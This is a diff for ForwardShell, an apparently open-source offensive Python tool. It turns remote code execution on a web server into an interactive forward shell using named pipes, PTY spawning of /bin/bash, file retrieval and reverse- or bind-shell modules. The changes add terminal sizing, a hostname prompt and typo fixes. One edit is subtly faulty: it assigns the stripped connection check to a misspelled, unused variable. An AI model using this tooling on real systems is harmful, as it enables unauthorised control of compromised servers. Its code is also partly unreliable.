@@ -22,6 +22,7 @@ import requests
 import threading
 import time
 import signal
+import subprocess
 import sys
 import urllib.parse
 from os.path import dirname
@@ -115,10 +116,10 @@ class WebShell(object):
         # Set up shell
         self.RunRawCmd(self.MakeNamedPipes, timeout=1)
         raw_result = self.RunRawCmd(f"{self.LS} {self.stdout}")
-        CheckConnction = self.DisplayResp(raw_result)
-        if CheckConnction:
-             CheckConnction = CheckConnction.rstrip()
-        if CheckConnction == f'{self.stdout}':
+        CheckConnection = self.DisplayResp(raw_result)
+        if CheckConnection:
+             CheckCheckConnection = CheckConnection.rstrip()
+        if CheckConnection == f'{self.stdout}':
             print(f"[+] Connection to {self.uri_parser(self.url)} with ID {self.session} established")
             ClearOutput = f'{self.ECHO} -n "" > {self.stdout}'
             self.RunRawCmd(ClearOutput)
@@ -151,7 +152,7 @@ class WebShell(object):
             print(
             f'[?] {__progname__} - Internal Commands:\n'
             f'\n'
-            f'  ?set                    Change Bind- and RervseShell parameters, like LHOST, LPORT and Shell type\n'
+            f'  ?set                    Change Bind- and ReverseShell parameters, like LHOST, LPORT and Shell type\n'
             f'  ?start                  Start a {__progname__} shell module\n'
             f'  ?start -m {{module}}      Start a specific shell module; available modules are Upgrade, RevShell and BindShell\n'
             f'  ?resume                 Resumes an existing shell on the target\n'
@@ -289,9 +290,14 @@ class WebShell(object):
             print(f'[*] Start PTY with {self.PYTHON}')
             UpgradeShell = f"""{self.PYTHON} -c 'import pty; print("Fwdsh-{self.session}"); pty.spawn("/bin/bash")'"""
             self.WriteCmd(UpgradeShell)
-            print(f'Just pimping your PTY a little bit...')
-            pimp_shell = f"""export TERM=xterm ; alias ll=\'ls -ali --color=auto\'"""
-            self.WriteCmd(pimp_shell)
+            print(f'Just upgrade your PTY a little bit...')
+            upgrade_pty = f"""export TERM=xterm-256color ; alias ll=\'ls -ali --color=auto\'"""
+
+            if not os.name == 'nt':
+                rows, cols = subprocess.check_output(['stty', 'size']).decode().split()
+                upgrade_pty = f"""export SHELL=bash; export TERM=xterm-256color; stty rows {rows} cols {cols}; alias ll=\'ls -ali --color=auto\'"""
+
+            self.WriteCmd(upgrade_pty)
 
         else:
             print(f"[ERROR] No Python found on target; PTY not possible")
@@ -430,7 +436,7 @@ class WebShell(object):
         try:
             with open(filename, 'wb') as file:
                 file.write(decompressed_data)
-                print(f'[*] Saved the file {filename} successfuly')
+                print(f'[*] Saved the file {filename} successfully')
         except:
             print(f'[ERROR] Something went wrong with saving the file {filename}')
 
@@ -508,7 +514,6 @@ class WebShell(object):
         raw_result = self.WriteCmd(OpenSessions, fifo=False)
         result = self.DisplayResp(raw_result).split('\n')
         print(f'Your own current session is: {self.session}\nThese are the current open sessions at {self.uri_parser(self.url)}:\n')
-        #print(f'Your current session is: {self.stdin.split(".")[1]}\nThese are the current open sessions on the target:\n')
         for session in result:
             print(f'> Session Number {result.index(session)}: {session.split(".")[1]}')
         
@@ -558,7 +563,7 @@ class WebShell(object):
 # Functions are:                                                                     # 
 # WriteCmd              Builds the RCE request                                       #
 # RunRawCmd             Sends the RCE request to the target                          #
-# ReadThread            Starts a Thread an reads RCE ouput constantly                #
+# ReadThread            Starts a Thread an reads RCE output constantly               #
 #                                                                                    #
 ######################################################################################
 
@@ -669,7 +674,7 @@ class WebShell(object):
 
         return display_result
 
-    # Helper Module to get the file system path of a programm
+    # Helper Module to get the file system path of a program
     def GetBinPath(self, file):
         binary_found = False
 
@@ -799,7 +804,7 @@ class WebShell(object):
 # Process command-line arguments.
 if __name__ == '__main__':
     __progname__ = 'ForwardShell'
-    __version__ = '0.4.1'
+    __version__ = '0.4.2'
 
     parser = argparse.ArgumentParser(
         add_help=True,
@@ -852,9 +857,10 @@ if __name__ == '__main__':
 
     # Initialize WebShell class
     S = WebShell()
+    prompt_host = S.WriteCmd('hostname -s',fifo=False).strip('\n')
 
     def prompt_loop():
-        prompt = "Shell:> "
+        prompt = f"Shell@{prompt_host}:> "
         
         try:
             print("[*] Type ? for help")
